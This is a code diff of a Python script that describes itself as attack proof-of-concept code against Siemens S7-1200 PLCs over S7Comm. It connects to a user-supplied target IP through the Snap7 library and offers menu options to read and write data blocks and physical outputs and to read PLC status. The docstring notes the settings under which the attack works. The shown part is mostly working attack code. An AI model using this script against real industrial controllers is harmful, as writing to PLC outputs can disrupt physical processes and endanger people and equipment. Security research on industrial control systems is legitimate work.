@@ -1,17 +1,28 @@
 #!/usr/bin/python -tt
 
-# Switching Q1 of 1200 controler
+"""
+ATTACK PROOF-OF-CONCEPT CODE UNSANCTIONED USE FORBIDDEN!
 
-# RESOURCES
-# 
+S7Comm attack aginst S7-1200 PLC.
+
+ Tested against PLC S7-1200, CPU 1215C:
+  1. PLC PUT/GET communication has to be enabled  (http://snap7.sourceforge.net/snap7_client.html);
+  2. Will work for 'Full access', 'Read access', and 'HMI access' settings.
+
+ Depends on:
+  1. Snap7 (http://snap7.sourceforge.net/)
+  2. Snap7-Python library (http://python-snap7.readthedocs.org/)
+
+Resources:
+  1. Snap7 Client: http://snap7.sourceforge.net/snap7_client.html
+  2. Snap7 1200 notes: http://snap7.sourceforge.net/snap7_client.html#1200_1500
+  3. S7comm explained http://gmiru.com/article/s7comm/
+"""
 
 import snap7
 import sys
 
 target_ip = input('Enter target IP: ')
-
-if target_ip == str(1):
-	target_ip = '192.168.1.203'
 
 plc = snap7.client.Client()
 plc.connect(str(target_ip),0,1)
@@ -20,12 +31,12 @@ print('Connected to %s' % target_ip)
 
 print('Chose what to do:')
 print('1. Read from DB')
-print('2. Read from Outputs')
+print('2. Read Output states')
 print('3. Writing to DB')
 print('4. Writing to Output')
 print('5. Read PLC status')
 
-item = int(input('Chose Number: '))
+item = int(input('Chose option: '))
 
 def read_from_db(plc, db_num, mem_start, size=1):
 
@@ -37,8 +48,8 @@ def read_from_db(plc, db_num, mem_start, size=1):
 		return err
 	return res
 
-def read_from_q(plc, area, db_num, mem_start, size=1):
-
+def read_from_outputs(plc, area, db_num, mem_start, size=1):
+	'''q -> outputs'''
 	try:
 		res = plc.read_area(area, db_num, mem_start, size)
 	except Exception as err:
